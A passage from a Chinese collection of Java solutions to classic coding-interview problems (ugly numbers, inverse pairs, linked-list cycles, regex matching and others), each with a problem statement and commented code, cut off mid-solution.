如果百位上数字大于1（2~9），则百位上出现1的情况仅由更高位决定，比如12213，则百位出现1的情况是：100~199,1100~1199，2100~2199，...，11100~11199,12100~12199,一共有1300个，并且等于更高位数字+1（12+1）乘以当前位数（100）。*/public class Solution &#123; public int NumberOf1Between1AndN_Solution(int n) &#123; //1的个数 int count = 0; //当前位 int i = 1; int current = 0, after = 0, before = 0; while ((n / i) != 0) &#123; //当前位数字 current = (n / i) % 10; //高位数字 before = n / (i * 10); //低位数字 after = n - (n / i) * i; //如果为0,出现1的次数由高位决定,等于高位数字 * 当前位数 if (current == 0)&#123; count += before * i; &#125; //如果为1,出现1的次数由高位和低位决定,高位*当前位+低位+1 else if (current == 1)&#123; count += before * i + after + 1; &#125; //如果大于1,出现1的次数由高位决定,//（高位数字+1）* 当前位数 else &#123; count += (before + 1) * i; &#125; //前移一位 i = i * 10; &#125; return count; &#125;&#125; 32.把数组排成最小的数标签：【数组】题目描述 输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。例如输入数组{3，32，321}，则打印出这三个数字能排成的最小数字为321323。 代码12345678910111213141516171819202122232425import java.util.ArrayList;public class Solution &#123; public String PrintMinNumber(int [] numbers) &#123; //实现一个类似于冒泡排序的算法，一个贪心的过程,每次找出使高位最小的那个数，比如，3,32组合332比323 //大，所以332口口口口口口也会比323口口口口口口要大，，然后将排完序的数字输出即可。 if(numbers==null || numbers.length==0)&#123; return ""; &#125; for(int i=0;i&lt;numbers.length;i++)&#123; for(int j=i+1;j&lt;numbers.length;j++)&#123; if(Integer.parseInt(numbers[i]+""+numbers[j])&gt; Integer.parseInt(numbers[j]+""+numbers[i]))&#123; int temp=numbers[j]; numbers[j]=numbers[i]; numbers[i]=temp; &#125; &#125; &#125; String res=""; for(int i=0;i&lt;numbers.length;i++)&#123; res=res+numbers[i]; &#125; return res; &#125;&#125; 33.丑数标签：【穷举】题目描述 把只包含质因子2、3和5的数称作丑数（Ugly Number）。例如6、8都是丑数，但14不是，因为它包含质因子7。 习惯上我们把1当做是第一个丑数。求按从小到大的顺序的第N个丑数。 代码1234567891011121314151617181920212223242526272829303132//维持三个指针来记录当前乘以2、乘以3、乘以5的最小值，相当于从3个维度来决定数组的下一个数字，落后的指针有//后发优势即可以乘上数组中在该指针后面位置存在的数字，然后当其被选为新的最小值后，要把相应的指针+1；因为//这个指针会逐渐遍历整个数组，因此最终数组中的每一个值都会被乘以2、乘以3、乘以5public class Solution &#123; public int GetUglyNumber_Solution(int index) &#123; if(index&lt;=0)&#123; return 0; &#125; int[] res=new int[index]; res[0]=1; //初始化指针指向最小丑数位置 int p2=0; int p3=0; int p5=0; for(int i=1;i&lt;index;i++)&#123; res[i]=Math.min(2*res[p2],Math.min(3*res[p3],5*res[p5])); //为了防止重复需要三个if都能够走到 if(res[i]==2*res[p2])&#123; p2++; &#125; //为了防止重复需要三个if都能够走到 if(res[i]==3*res[p3])&#123; p3++; &#125; //为了防止重复需要三个if都能够走到 if(res[i]==5*res[p5])&#123; p5++; &#125; &#125; return res[index-1]; &#125;&#125; 34.第一个只出现一次的字符标签：【字符串】题目描述 在一个字符串(0&lt;=字符串长度&lt;=10000，全部由字母组成)中找到第一个只出现一次的字符,并返回它的位置, 如果没有则返回 -1（需要区分大小写）.（从0开始计数） 代码12345678910111213141516171819202122232425262728import java.util.LinkedHashMap;public class Solution &#123; public int FirstNotRepeatingChar(String str) &#123; if(str==null ||str.length()==0)&#123; return -1; &#125; if(str.length()==1)&#123; return 0; &#125; //LinkedHashMap维护插入顺序，记录以字符为key的元素出现次数以及位置 LinkedHashMap&lt;Character,Integer&gt; map=new LinkedHashMap&lt;Character,Integer&gt;(); for(int i=0;i&lt;str.length();i++)&#123; if(map.get(str.charAt(i))==null)&#123; map.put(str.charAt(i),i); &#125; else&#123; map.put(str.charAt(i),-1); &#125; &#125; //遍历key，找到那个第一个只出现一次的字符 for(Character c:map.keySet())&#123; if(map.get(c)!=-1)&#123; return map.get(c); &#125; &#125; return -1; &#125;&#125; 35.数组中的逆序对标签：【数组】题目描述 在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组,求出这个数组中的逆序对的总数P。并将P对1000000007取模的结果输出。 即输出P%1000000007 输入描述： 12&gt; 题目保证输入的数组中没有的相同的数字数据范围： 对于%50的数据,size&lt;=10^4 对于%75的数据,size&lt;=10^5 对于%100的数据,size&lt;=2*10^5&gt; 示例： 输入 12&gt; 1,2,3,4,5,6,7,0&gt; 输出 12&gt; 7&gt; 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class Solution &#123; int count = 0; public int InversePairs(int[] array) &#123; if (array == null || array.length == 0) &#123; return count; &#125; patition(array, 0, array.length - 1); return count; &#125; private void patition(int[] array, int start, int end) &#123; if (start &gt;= end) &#123; return; &#125; int mid = (start + end) / 2; //划分子区间 patition(array, start, mid); patition(array, mid + 1, end); merge(array, start, mid, end); &#125; //归并排序 private void merge(int[] array, int start, int mid, int end) &#123; int i = start; int j = mid + 1; int t = 0; int[] temp = new int[end - start + 1]; while (i &lt;= mid &amp;&amp; j &lt;= end) &#123; if (array[i] &lt;= array[j]) &#123; temp[t++] = array[i++]; &#125; else &#123; temp[t++] = array[j++]; //计数，减少计算 count = count + mid - i + 1; count = count % 1000000007; &#125; &#125; while (i &lt;= mid) &#123; temp[t++] = array[i++]; &#125; while (j &lt;= end) &#123; temp[t++] = array[j++]; &#125; //排序结果写入原数组 for (int k = 0; k &lt; temp.length; k++) &#123; array[start + k] = temp[k]; &#125; &#125;&#125; 36.两个链表的第一个公共结点标签：【链表】题目描述 输入两个链表，找出它们的第一个公共结点。（注意因为传入数据是链表，所以错误测试数据的提示是用其他方式显示的，保证传入数据是正确的） 1234567891011121314151617181920212223242526/*public class ListNode &#123; int val; ListNode next = null; ListNode(int val) &#123; this.val = val; &#125;&#125;*//*双指针法。创建两个指针p1和p2,分别指向两个链表的头结点，然后依次往后遍历。如果某个指针到达末尾，则将该指针指向另一个链表的头结点；如果两个指针所指的节点相同，则循环结束，返回当前指针指向的节点。比如两个链表分别为：1-&gt;3-&gt;4-&gt;5-&gt;6和2-&gt;7-&gt;8-&gt;9-&gt;5-&gt;6。短链表的指针p1会先到达尾部，然后重新指向长链表头部，当长链表的指针p2到达尾部时，重新指向短链表头部，此时p1在长链表中已经多走了k步(k为两个链表的长度差值)，p1和p2位于同一起跑线，往后遍历找到相同节点即可到达第一个公共结点。其实该方法主要就是用链表循环的方式替代了长链表指针先走k步这一步骤。*/public class Solution &#123; public ListNode FindFirstCommonNode(ListNode pHead1, ListNode pHead2) &#123; if (pHead1 == null || pHead2 == null) &#123; return null; &#125; ListNode p1 = pHead1; ListNode p2 = pHead2; while (p1 != p2) &#123; p1 = p1== null ? pHead2 : p1.next; p2 = p2== null ? pHead1 : p2.next; &#125; return p1; &#125;&#125; 37.数字在排序数组中出现的次数标签：【数组】题目描述 统计一个数字在排序数组中出现的次数。 12345678910111213141516171819202122232425import java.util.Arrays;public class Solution &#123; public int GetNumberOfK(int [] array , int k) &#123; if(array==null ||array.length==0)&#123; return 0; &#125; //用Arrays.binarySearch二分查找出目标数字在有序数组的索引下标 int index=Arrays.binarySearch(array,k); //不存在则返回应该插入的位置，如&#123;2,4,6&#125;，查找0返回-1，查找3返回-2，查找7返回-4，即返回 //-（实际应插入数组位置+1） if(index&lt;=-1)&#123; return 0; &#125; int count=1; //统计右边相同的数字 for(int i=index+1;i&lt;array.length &amp;&amp;array[i]==k;i++)&#123; count++; &#125; //统计左边相同的数字 for(int i=index-1;i&gt;=0 &amp;&amp;array[i]==k;i--)&#123; count++; &#125; return count; &#125;&#125; 38.二叉树的深度标签：【树】题目描述 输入一棵二叉树，求该树的深度。从根结点到叶结点依次经过的结点（含根、叶结点）形成树的一条路径，最长路径的长度为树的深度。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/** * public class TreeNode &#123; * int val = 0; * TreeNode left = null; * TreeNode right = null; * &lt;p&gt; * public TreeNode(int val) &#123; * this.val = val; * &lt;p&gt; * &#125; * &lt;p&gt; * &#125; */import java.util.LinkedList;public class Solution &#123;/* //深度优先递归 public int TreeDepth(TreeNode root) &#123; if (null == root) &#123; return 0; &#125; int left = 0; int right = 0; if (root.left != null) &#123; left = TreeDepth(root.left); &#125; if (root.right != null) &#123; right = TreeDepth(root.right); &#125; return 1 + (left &gt;= right ? left : right); &#125;*/ //层次遍历 public int TreeDepth(TreeNode root) &#123; if (root == null) &#123; return 0; &#125; LinkedList&lt;TreeNode&gt; list = new LinkedList&lt;TreeNode&gt;(); list.add(root); int count = 0; while (list.size() != 0) &#123; count++; int size = list.size(); for (int i = 0; i &lt; size; i++) &#123; TreeNode curr = list.remove(); if (curr.left != null) &#123; list.add(curr.left); &#125; if (curr.right != null) &#123; list.add(curr.right); &#125; &#125; &#125; return count; &#125;&#125; 39.平衡二叉树标签：【树】题目描述 输入一棵二叉树，判断该二叉树是否是平衡二叉树。 在这里，我们只需要考虑其平衡性，不需要考虑其是不是排序二叉树 12345678910111213141516171819202122232425public class Solution &#123; public boolean IsBalanced_Solution(TreeNode root) &#123; return deepth(root)!=-1; &#125; private int deepth(TreeNode root)&#123; if(root==null)&#123; return 0; &#125; int left=deepth(root.left); //剪枝 if(left==-1)&#123; return -1; &#125; int right=deepth(root.right); //剪枝 if(right==-1)&#123; return -1; &#125; //不平衡 if(Math.abs(left-right)&gt;1)&#123; return -1; &#125; return (left&gt;right?left:right)+1; &#125;&#125; 40.数组中只出现一次的数字标签：【数组】题目描述 一个整型数组里除了两个数字之外，其他的数字都出现了两次。请写程序找出这两个只出现一次的数字。 123456789101112131415161718192021222324252627282930313233//num1,num2分别为长度为1的数组。传出参数//将num1[0],num2[0]设置为返回结果/* 首先：位运算中异或的性质：两个相同数字异或=0，一个数和0异或还是它本身。当只有一个数出现一次时，我们把数组中所有的数，依次异或运算，最后剩下的就是落单的数，因为成对儿出现的都抵消了。依照这个思路，我们来看两个数（我们假设是AB）出现一次的数组。我们首先还是先异或，剩下的数字肯定是A、B异或的结果，这个结果的二进制中的1，表现的是A和B的不同的位。我们就取第一个1所在的位数，假设是第3位，接着把原数组分成两组，分组标准是第3位是否为1。如此，相同的数肯定在一个组，因为相同数字所有位都相同，而不同的数，肯定不在一组。然后把这两个组按照最开始的思路，依次异或，剩余的两个结果就是这两个只出现一次的数字。*/public class Solution &#123; public void FindNumsAppearOnce(int[] array, int num1[], int num2[]) &#123; int res = 0; for (int i = 0; i &lt; array.length; i++) &#123; res = res ^ array[i]; &#125; //此时res为这两个只出现一次的数异或的结果 int temp = 1; //从低位到高位开始寻找这两个数不同的位，即res中为1的位 while ((temp &amp; res) == 0) &#123; temp = temp &lt;&lt; 1; &#125; int one = 0; int two = 0; for (int i = 0; i &lt; array.length; i++) &#123; //根据这个指定位的不同，分成两类 if ((array[i] &amp; temp) == 0) &#123; one = one ^ array[i]; &#125; //根据这个指定位的不同，分成两类 else &#123; two = two ^ array[i]; &#125; &#125; num1[0] = one; num2[0] = two; &#125;&#125; 41.和为S的连续正数序列标签：【穷举】题目描述 小明很喜欢数学,有一天他在做数学作业时,要求计算出9~16的和,他马上就写出了正确答案是100。但是他并不满足于此,他在想究竟有多少种连续的正数序列的和为100(至少包括两个数)。没多久,他就得到另一组连续正数和为100的序列:18,19,20,21,22。现在把问题交给你,你能不能也很快的找出所有和为S的连续正数序列? Good Luck! 输出描述： 12&gt; 输出所有和为S的连续正数序列。序列内按照从小至大的顺序，序列间按照开始数字从小到大的顺序&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import java.util.ArrayList;/** * 滑动窗口法解连续区间和问题 * * 1.什么是滑动窗口？顾名思义，首先是一个窗口，既然是一个窗口，就需要用窗口的左边界i和右边界j来唯一表示一 个窗口，其次，滑动代表，窗口始终从左往右移动，这也表明左边界i和右边界j始终会往后移动，而不会往左移动。 * 2.滑动窗口的操作 * 扩大窗口，j += 1 * 缩小窗口，i += 1 * 算法步骤： * （1）初始化，i=1,j=1, 表示窗口大小为0 * （2）如果窗口中值的和小于目标值sum， 表示需要扩大窗口，j += 1 * （3）否则，如果狂口值和大于目标值sum，表示需要缩小窗口，i += 1 * （4）否则，等于目标值，存结果，缩小窗口，继续进行步骤2,3,4 * 这里需要注意2个问题： * （1）什么时候窗口终止呢，这里窗口左边界走到sum的一半即可终止，因为题目要求至少包含2个数 * （2）什么时候需要扩大窗口和缩小窗口？解释可看上述算法步骤。 */public class Solution &#123; public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindContinuousSequence(int sum) &#123; int left = 1; int right = 2; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; res = new ArrayList&lt;ArrayList&lt;Integer&gt;&gt;(); while (left &lt;= sum / 2 &amp;&amp; right &lt;= sum) &#123; int count = 0; for (int i = left; i &lt;= right; i++) &#123; count += i; &#125; //right加1，向右扩张 if (count &lt; sum) &#123; right++; &#125; //left加1，向右收缩 else if (count &gt; sum) &#123; left++; &#125; else &#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); for (int i = left; i &lt;= right; i++) &#123; list.add(i); &#125; res.add(list); left++; &#125; &#125; return res; &#125;&#125; 42.和为S的两个数字标签：【数学】【数组】【双指针】题目描述 输入一个递增排序的数组和一个数字S，在数组中查找两个数，使得他们的和正好是S，如果有多对数字的和等于S，输出两个数的乘积最小的。 输出描述： 12&gt; 对应每个测试案例，输出两个数，小的先输出。&gt; 12345678910111213141516171819202122232425262728293031import java.util.ArrayList;public class Solution &#123; public ArrayList&lt;Integer&gt; FindNumbersWithSum(int[] array, int sum) &#123; ArrayList&lt;Integer&gt; res = new ArrayList&lt;Integer&gt;(); if (array == null || array.length == 0) &#123; return res; &#125; //双指针 int left = 0; int right = array.length - 1; //乘积 int product = Integer.MAX_VALUE; //前后两个指针相遇就停止 while (left &lt; right) &#123; if (array[left] + array[right] == sum) &#123; if (array[left] * array[right] &lt; product) &#123; product = array[left] * array[right]; res.add(0, array[left]); res.add(1, array[right]); &#125; left++; &#125; else if (array[left] + array[right] &gt; sum) &#123; right--; &#125; else &#123; left++; &#125; &#125; return res; &#125;&#125; 43.左旋转字符串标签：【字符串】题目描述 汇编语言中有一种移位指令叫做循环左移（ROL），现在有个简单的任务，就是用字符串模拟这个指令的运算结果。对于一个给定的字符序列S，请你把其循环左移K位后的序列输出。例如，字符序列S=”abcXYZdef”,要求输出循环左移3位后的结果，即“XYZdefabc”。是不是很简单？OK，搞定它！ 1234567891011121314151617181920212223import java.util.LinkedList;public class Solution &#123; public String LeftRotateString(String str, int n) &#123; LinkedList&lt;Character&gt; list1 = new LinkedList&lt;Character&gt;(); LinkedList&lt;Character&gt; list2 = new LinkedList&lt;Character&gt;(); for (int i = 0; i &lt; str.length(); i++) &#123; if (i &lt; n % str.length()) &#123; list1.add(str.charAt(i)); &#125; else &#123; list2.add(str.charAt(i)); &#125; &#125; StringBuffer sb = new StringBuffer(); while (list2.size() != 0) &#123; sb.append(list2.remove()); &#125; while (list1.size() != 0) &#123; sb.append(list1.remove()); &#125; return sb.toString(); &#125;&#125; 44.翻转单词顺序序列标签：【字符串】题目描述 牛客最近来了一个新员工Fish，每天早晨总是会拿着一本英文杂志，写些句子在本子上。同事Cat对Fish写的内容颇感兴趣，有一天他向Fish借来翻看，但却读不懂它的意思。例如，“student. a am I”。后来才意识到，这家伙原来把句子单词的顺序翻转了，正确的句子应该是“I am a student.”。Cat对一一的翻转这些单词顺序可不在行，你能帮助他么？ 123456789101112131415161718192021public class Solution &#123; public String ReverseSentence(String str) &#123; if(str==null ||str.length()==0)&#123; return ""; &#125; //String.trim()方法去除字符串前后的空格 if(str.trim().equals("")) &#123; return str; &#125; //以空格分割字符串 String[] input=str.split("\\s"); StringBuffer sb=new StringBuffer(); for(int i=input.length-1;i&gt;=0;i--)&#123; sb.append(input[i]).append(" "); &#125; String res=sb.toString(); //输出字符串，去除最后一个空格 return res.substring(0,res.length()-1); &#125;&#125; 45.扑克牌顺子标签：【字符串】题目描述 LL今天心情特别好,因为他去买了一副扑克牌,发现里面居然有2个大王,2个小王(一副牌原本是54张^_^)…他随机从中抽出了5张牌,想测测自己的手气,看看能不能抽到顺子,如果抽到的话,他决定去买体育彩票,嘿嘿！！“红心A,黑桃3,小王,大王,方片5”,“Oh My God!”不是顺子…..LL不高兴了,他想了想,决定大\小 王可以看成任何数字,并且A看作1,J为11,Q为12,K为13。上面的5张牌就可以变成“1,2,3,4,5”(大小王分别看作2和4),“So Lucky!”。LL决定去买体育彩票啦。 现在,要求你使用这幅牌模拟上面的过程,然后告诉我们LL的运气如何， 如果牌能组成顺子就输出true，否则就输出false。为了方便起见,你可以认为大小王是0。 12345678910111213141516171819202122232425262728/***简单来说就是要是5个数字，最大和最小差值在5以内，并且没有重复数值。用一个set来填充数据，0不要放进去。set的*大小加上0的个数必须为5个。此外set中数值差值在5以内。*/import java.util.TreeSet;public class Solution &#123; public boolean isContinuous(int[] numbers) &#123; if (numbers.length &lt; 5 || numbers.length &gt; 5) &#123; return false; &#125; TreeSet&lt;Integer&gt; set = new TreeSet&lt;Integer&gt;(); int num = 0; for (int i = 0; i &lt; numbers.length; i++) &#123; if (numbers[i] == 0) &#123; num++; &#125; else &#123; set.add(numbers[i]); &#125; &#125; if (num + set.size() != 5) &#123; return false; &#125; if (set.last() - set.first() &lt; 5) &#123; return true; &#125; return false; &#125;&#125; 46.孩子们的游戏（圆圈中最后剩下的数）标签：【链表】【数学】题目描述 每年六一儿童节,牛客都会准备一些小礼物去看望孤儿院的小朋友,今年亦是如此。HF作为牛客的资深元老,自然也准备了一些小游戏。其中,有个游戏是这样的:首先,让小朋友们围成一个大圈。然后,他随机指定一个数m,让编号为0的小朋友开始报数。每次喊到m-1的那个小朋友要出列唱首歌,然后可以在礼品箱中任意的挑选礼物,并且不再回到圈中,从他的下一个小朋友开始,继续0…m-1报数….这样下去….直到剩下最后一个小朋友,可以不用表演,并且拿到牛客名贵的“名侦探柯南”典藏版(名额有限哦!!^_^)。请你试着想下,哪个小朋友会得到这份礼品呢？(注：小朋友的编号是从0到n-1) 如果没有小朋友，请返回-1 1234567891011121314151617181920212223import java.util.LinkedList;public class Solution &#123; public int LastRemaining_Solution(int n, int m) &#123; if(n&lt;=0)&#123; return -1; &#125; LinkedList&lt;Integer&gt; list =new LinkedList&lt;Integer&gt;(); for(int i=0;i&lt;n;i++)&#123; list.add(i); &#125; //被提出的小朋友 int out=0; while(list.size()&gt;1)&#123; //防止超出列表长度 out=(out+m-1)%list.size(); //移除 list.remove(out); &#125; //剩余的最后一个小朋友 return list.get(0); &#125;&#125; 47.求1+2+3+…+n标签：【进制转化】【数学】题目描述 求1+2+3+…+n，要求不能使用乘除法、for、while、if、else、switch、case等关键字及条件判断语句（A?B:C）。 12345678public class Solution &#123; public int Sum_Solution(int n) &#123; int sum = n; //逻辑且的短路原理，当n=0时，不再往下递归 boolean temp = (n != 0) &amp;&amp; ((sum = sum + Sum_Solution(n - 1)) != 0); return sum; &#125;&#125; 48.不用加减乘除做加法标签：【进制转化】【数学】题目描述 写一个函数，求两个整数之和，要求在函数体内不得使用+、-、*、/四则运算符号。 1234567891011121314151617/*** 执行加法 x ^ y* 进位操作 ( x &amp; y ) &lt;&lt; 1*/public class Solution &#123; public int Add(int num1,int num2) &#123; while(num2!=0)&#123; //保存进位信息 int temp=(num1&amp;num2)&lt;&lt;1; //二进制加 num1=num1^num2; //进位赋予num2，循环执行相加，直到无进位为止 num2=temp; &#125; return num1; &#125;&#125; 49.把字符串转换成整数标签：【字符串】【数学】【字符串】题目描述 将一个字符串转换成一个整数，要求不能使用字符串转换整数的库函数。 数值为0或者字符串不是一个合法的数值则返回0 输入描述： 12&gt; 输入一个字符串,包括数字字母符号,可以为空&gt; 输出描述： 12&gt; 如果是合法的数值表达则返回该数字，否则返回0&gt; 示例1 输入 123&gt; +2147483647&gt; 1a33&gt; 输出 123&gt; 2147483647&gt; 0&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class Solution &#123; public int StrToInt(String str) &#123; if (str == null || str.length() == 0) &#123; return 0; &#125; //第一个字符 char first = str.charAt(0); //整数转化开始下标 int start = 0; //符号标记，正数为0，负数为1 int flag = 0; if (first == '+') &#123; start = 1; &#125; else if (first == '-') &#123; start = 1; flag = 1; &#125; else if (first &lt; '0' || first &gt; '9') &#123; return 0; &#125; long res = 0; for (int i = start; i &lt; str.length(); i++) &#123; if (str.charAt(i) &gt;= '0' &amp;&amp; str.charAt(i) &lt;= '9') &#123; res = res * 10 + str.charAt(i) - '0'; &#125; else &#123; return 0; &#125; &#125; if (flag == 0) &#123; //正整数溢出 if (res &gt; Integer.MAX_VALUE) &#123; return 0; &#125; &#125; if (flag == 1) &#123; //负整数溢出 if ((-1) * res &lt; Integer.MIN_VALUE) &#123; return 0; &#125; res = (int) (-1 * res); &#125; return (int) res; &#125;&#125; 50.数组中重复的数字标签：【数组】题目描述 在一个长度为n的数组里的所有数字都在0到n-1的范围内。 数组中某些数字是重复的，但不知道有几个数字是重复的。也不知道每个数字重复几次。请找出数组中任意一个重复的数字。 例如，如果输入长度为7的数组{2,3,1,0,2,5,3}，那么对应的输出是第一个重复的数字2。 1234567891011121314151617181920import java.util.HashMap;public class Solution &#123; public boolean duplicate(int numbers[], int length, int[] duplication) &#123; if (numbers == null || length &lt;= 1) &#123; return false; &#125; HashMap&lt;Integer, Boolean&gt; map = new HashMap&lt;Integer, Boolean&gt;(); for (int i = 0; i &lt; length; i++) &#123; if (map.get(numbers[i]) == null) &#123; map.put(numbers[i], true); &#125; else if (map.get(numbers[i])) &#123; //第一个重复的数放到duplication[0]返回 duplication[0] = numbers[i]; return true; &#125; &#125; return false; &#125;&#125; 51.构建乘积数组标签：【数组】题目描述 给定一个数组A[0,1,…,n-1],请构建一个数组B[0,1,…,n-1],其中B中的元素B[i]=A[0]A[1]…A[i-1]A[i+1]…A[n-1]。不能使用除法。（注意：规定B[0] = A[1] A[2] … A[n-1]，B[n-1] = A[0] A[1] … A[n-2];） 对于A长度为1的情况，B无意义，故而无法构建，因此该情况不会存在。 123456789101112131415161718192021222324252627import java.util.ArrayList;/*** 暴力计算就完了*/public class Solution &#123; public int[] multiply(int[] A) &#123; int B[]=new int[A.length]; int shunxu[] =new int[A.length]; int nixu[] =new int[A.length]; int temp_shun=1; int temp_ni=1; for(int i =0;i&lt;A.length;i++)&#123; temp_shun*=A[i]; shunxu[i]=temp_shun; &#125; for(int j=A.length-1;j&gt;=0;j--)&#123; temp_ni*=A[j]; nixu[j]=temp_ni; &#125; B[0]=nixu[1]; for(int k=1;k&lt;A.length-1;k++)&#123; B[k]=shunxu[k-1]*nixu[k+1]; &#125; B[A.length-1]=shunxu[A.length-2]; return B; &#125;&#125; 52.正则表达式匹配标签：【字符串】题目描述 请实现一个函数用来匹配包括’.’和’‘的正则表达式。模式中的字符’.’表示任意一个字符，而’‘表示它前面的字符可以出现任意次（包含0次）。 在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串”aaa”与模式”a.a”和”abaca”匹配，但是与”aa.a”和”ab*a”均不匹配 123456789101112131415161718192021222324252627282930313233343536373839public class Solution &#123; public boolean matchStr(char[] str, int i, char[] pattern, int j) &#123; // 边界 if (i == str.length &amp;&amp; j == pattern.length) &#123; // 字符串和模式串都为空 return true; &#125; else if (j == pattern.length) &#123; // 模式串为空 return false; &#125; boolean flag = false; boolean next = (j + 1 &lt; pattern.length &amp;&amp; pattern[j + 1] == '*'); // 模式串下一个字符是'*' if (next) &#123; if (i &lt; str.length &amp;&amp; (pattern[j] == '.' || str[i] == pattern[j])) &#123; /* * 要保证i&lt;str.length，否则越界。 * 出现了'*'，而且i和j指向的相等（这里的相等可以是真正的相等，也可以是'.'标记的相等）。 * 比如abcd和ab*cf，其中i和j都指向了b。此时应该i+1和j+2。比如abbcd和ab*cf，其中i和j都指向了b。 * 由于b出现了多次，应该不着急移动j，所以此时i+1即可。 * 比如"cba","cb*a*a"，我也可以认为，j指向的第1个a没出现过，即使你相等。因此此时可以i不动，j+2。 */ return matchStr(str, i, pattern, j + 2) || matchStr(str, i + 1, pattern, j); &#125; else &#123; return matchStr(str, i, pattern, j + 2); &#125; &#125; else &#123; if (i &lt; str.length &amp;&amp; (pattern[j] == '.' || str[i] == pattern[j])) &#123; return matchStr(str, i + 1, pattern, j + 1); &#125; else &#123; return false; &#125; &#125; &#125; public boolean match(char[] str, char[] pattern) &#123; return matchStr(str, 0, pattern, 0); &#125;&#125; 53.表示数值的字符串标签：【字符串】题目描述 请实现一个函数用来判断字符串是否表示数值（包括整数和小数）。例如，字符串”+100”,”5e2”,”-123”,”3.1416”和”-1E-16”都表示数值。 但是”12e”,”1a3.14”,”1.2.3”,”+-5”和”12e+4.3”都不是。 123456789101112131415public class Solution &#123; public boolean isNumeric(char[] str) &#123; /* 使用正则表达式 [\\+\\-]? -&gt; 正或负符号出现与否 \\d* -&gt; 整数部分是否出现，如-.34 或 +3.34均符合 (\\.\\d+)? -&gt; 如果出现小数点，那么小数点后面必须有数字； 否则一起不出现 ([eE][\\+\\-]?\\d+)? -&gt; 如果存在指数部分，那么e或E肯定出现，+或-可以不出现， 紧接着必须跟着整数；或者整个部分都不出现 */ String string = String.valueOf(str); return string.matches("[\\+\\-]?\\d*(\\.\\d+)?([eE][\\+\\-]?\\d+)?"); &#125;&#125; 54.字符流中第一个不重复的字符标签：【字符串】题目描述 请实现一个函数用来找出字符流中第一个只出现一次的字符。例如，当从字符流中只读出前两个字符”go”时，第一个只出现一次的字符是”g”。当从该字符流中读出前六个字符“google”时，第一个只出现一次的字符是”l”。 输出描述： 12&gt; 如果当前字符流没有存在出现一次的字符，返回#字符。&gt; 123456789101112131415161718192021public class Solution &#123; //Insert one char from stringstream String input = ""; char[] count = new char[256]; public void Insert(char ch) &#123; input += ch; //char型的数可以看成一个整数，计算机里保存char也是保存数值的 count[ch]++; &#125; //return the first appearence once char in current stringstream public char FirstAppearingOnce() &#123; for (int i = 0; i &lt; input.length(); i++) &#123; if (count[input.charAt(i)] == 1) &#123; return input.charAt(i); &#125; &#125; return '#'; &#125;&#125; 55.链表中环的入口结点标签：【链表】题目描述 给一个链表，若其中包含环，请找出该链表的环的入口结点，否则，输出null。 1234567891011121314151617181920212223242526272829303132333435363738394041424344/* public class ListNode &#123; int val; ListNode next = null; ListNode(int val) &#123; this.val = val; &#125;&#125;*//***快慢指针法：step1.快指针每次走两步，慢指针每次走一步，直到两指针相遇；* step2.快指针从链表头开始以一步的步长移动，慢指针从相遇点开始以一步的步长移动，等再次相遇的时* 候，相遇点即链表环的入口。*/public class Solution &#123; public ListNode EntryNodeOfLoop(ListNode pHead) &#123; if (pHead == null || pHead.next == null) &#123; return null; &#125; ListNode fast = pHead; ListNode slow = pHead; if (fast.next != null &amp;&amp; fast.next.next != null) &#123; fast = fast.next.next; slow = slow.next; while (fast != slow &amp;&amp; fast != null &amp;&amp; fast.next != null) &#123; fast = fast.next.next; slow = slow.next; &#125; if (fast != null &amp;&amp; fast.next != null) &#123; fast = pHead; while (fast != slow) &#123; fast = fast.next; slow = slow.next; &#125; return fast; &#125; else &#123; return null; &#125; &#125; return null; &#125;&#125; 56.删除链表中重复的结点标签：【链表】题目描述 在一个排序的链表中，存在重复的结点，请删除该链表中重复的结点，重复的结点不保留，返回链表头指针。 例如，链表1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 处理后为 1-&gt;2-&gt;5 1234567891011121314151617181920212223242526272829303132333435363738/* public class ListNode &#123; int val; ListNode next = null; ListNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public ListNode deleteDuplication(ListNode pHead) &#123; if (pHead == null) &#123; return pHead; &#125; //哨兵结点，主要是为了返回调整后的链表头结点方便 ListNode head = new ListNode(0); //保留当前调整结点的前驱结点信息，前驱结点的后继指针可能要调整 ListNode pre = head; //正在处理的结点 ListNode curr = pHead; head.next = pHead; while (curr != null) &#123; if (curr.next != null &amp;&amp; curr.val == curr.next.val) &#123; curr = curr.next; while (curr.next != null &amp;&amp; curr.val == curr.next.val) &#123; curr = curr.next; &#125; curr = curr.next; pre.next = curr; &#125; else &#123; pre = curr; curr = curr.next; &#125; &#125; return head.next; &#125;&#125; 57.二叉树的下一个结点标签：【树】题目描述 给定一个二叉树和其中的一个结点，请找出中序遍历顺序的下一个结点并且返回。注意，树中的结点不仅包含左右子结点，同时包含指向父结点的指针。 123456789101112131415161718192021222324252627282930313233343536373839/*public class TreeLinkNode &#123; int val; TreeLinkNode left = null; TreeLinkNode right = null; //父结点 TreeLinkNode next = null; TreeLinkNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public TreeLinkNode GetNext(TreeLinkNode pNode) &#123; if (pNode == null) &#123; return null; &#125; //以pNode为开始结点的树有右子树的话，中序遍历的下一个结点是右子树的最左孩子结点 if (pNode.right != null) &#123; pNode = pNode.right; while (pNode.left != null) &#123; pNode = pNode.left; &#125; return pNode; &#125; //pNode有父结点的情况 while (pNode.next != null) &#123; //当pNode是其父结点的左孩子时，父结点为中序遍历的下一个结点 if (pNode.next.left == pNode) &#123; return pNode.next; &#125; //否则，将当前查询结点设为其父结点，继续进行查找 pNode = pNode.next; &#125; //pNode无父结点情况 return null; &#125;&#125; 58.对称的二叉树标签：【树】题目描述 请实现一个函数，用来判断一棵二叉树是不是对称的。注意，如果一个二叉树同此二叉树的镜像是同样的，定义其为对称的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657/*public class TreeNode &#123; int val = 0; TreeNode left = null; TreeNode right = 